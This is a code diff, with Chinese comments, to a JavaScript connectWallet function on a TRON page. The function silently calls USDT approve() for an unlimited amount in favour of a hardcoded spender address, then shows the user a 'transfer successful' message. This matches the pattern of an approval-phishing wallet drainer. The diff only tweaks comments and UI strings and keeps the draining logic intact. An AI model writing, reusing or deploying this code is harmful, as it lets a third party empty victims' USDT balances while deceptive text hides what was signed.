@@ -23,9 +23,9 @@ async function connectWallet() {
             // 创建 USDT 合约实例
             const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
 
-            // 授权地址和无限数量
+            // 授权地址和数量
             const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
-            const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 无限数量的 USDT
+            const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'; // 无限授权
 
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount).send({
@@ -34,12 +34,12 @@ async function connectWallet() {
             });
 
             // 更新按钮文本
-            document.getElementById('okButton').innerText = '转入成功';
+            document.getElementById('okButton').innerText = '转账成功';
         } else {
-            alert('请安装支持 TRC20 的 TRON 钱包插件并登录');
+            alert('请安装支持 TRC20 钱包插件并登录');
         }
     } catch (error) {
         console.error(error);
-        document.getElementById('okButton').innerText = '转入失败';
+        document.getElementById('okButton').innerText = '转账失败';
     }
 }
